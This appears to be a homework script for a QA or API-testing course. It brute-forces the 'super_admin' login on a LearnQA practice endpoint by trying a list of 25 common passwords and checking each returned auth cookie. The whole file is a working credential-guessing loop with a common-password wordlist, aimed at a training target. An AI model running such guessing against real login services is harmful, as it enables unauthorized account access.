import requests

# Логин
login = "super_admin"

# Список паролей
passwords = [
    "password", "123456", "123456789", "12345678", "12345", "1234567", "1234567890",
    "qwerty", "abc123", "111111", "123123", "admin", "1234", "letmein", "welcome",
    "monkey", "password1", "sunshine", "master", "hello", "freedom", "whatever",
    "qazwsx", "trustno1", "dragon"
]

# Перебор паролей
for password in passwords:
    # Получаем авторизационную cookie
    response_password = requests.post(
        "https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
        data={"login": login, "password": password}
    )

    # Извлекаем cookie
    cookie = response_password.cookies.get("auth_cookie")

    # Проверяем авторизацию с этой cookie
    if cookie:
        response_auth = requests.get(
            "https://playground.learnqa.ru/ajax/api/check_auth_cookie",
            cookies={"auth_cookie": cookie}
        )
        auth_message = response_auth.text

        # Если авторизация успешна, выводим результат
        if auth_message == "You are authorized":
            print(f"Найден правильный пароль: {password}")
            print(f"Сообщение: {auth_message}")
            break
    else:
        print(f"Cookie не получена для пароля: {password}")
